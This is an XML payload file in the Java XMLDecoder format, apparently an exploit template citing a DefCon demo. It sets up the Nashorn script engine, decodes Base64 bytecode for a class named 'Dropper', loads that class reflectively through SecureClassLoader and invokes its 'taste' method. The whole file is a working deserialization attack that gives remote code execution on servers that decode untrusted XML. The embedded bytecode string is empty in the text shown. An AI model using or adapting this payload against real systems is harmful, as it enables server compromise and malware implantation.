<?xml version="1.0" encoding="UTF-8"?>
<java>
    <!-- see https://github.com/o2platform/DefCon_RESTing/blob/master/Demos/_O2_Scripts/XmlEncoder%20-%20Restlet/exploits/8e%20-%20HttpResponse%20-%20execute%20process%20-%20read%20two%20lines.xml -->
     <object class="javax.script.ScriptEngineManager">
        <void id="mgr" method="getEngineByName">
            <string>nashorn</string>
        </void>
    </object>
    <object idref="mgr">
        <void method="eval">
            <string>
                var className = "party.itistimeto.broodwich.Dropper";
                // todo: gzip
                var encodedBytecode = "";
                var bytecode = java.util.Base64.getDecoder().decode(encodedBytecode);
                var bytecodeBuffer = java.nio.ByteBuffer.wrap(bytecode);
                var sclClazz = java.security.SecureClassLoader.class;
                var sclConstructor = sclClazz.getDeclaredConstructor(java.lang.ClassLoader.class);
                sclConstructor.setAccessible(true);
                var scl = sclConstructor.newInstance(java.lang.Thread.currentThread().getContextClassLoader());
                var defineClass = sclClazz.getDeclaredMethod("defineClass", java.lang.String.class,
                java.nio.ByteBuffer.class, java.security.CodeSource.class);
                defineClass.setAccessible(true);
                var calcClass = defineClass.invoke(scl, className, bytecodeBuffer, null);
                calcClass.getMethod("taste", java.lang.String.class).invoke(null, "/*");
            </string>
        </void>
    </object>
</java>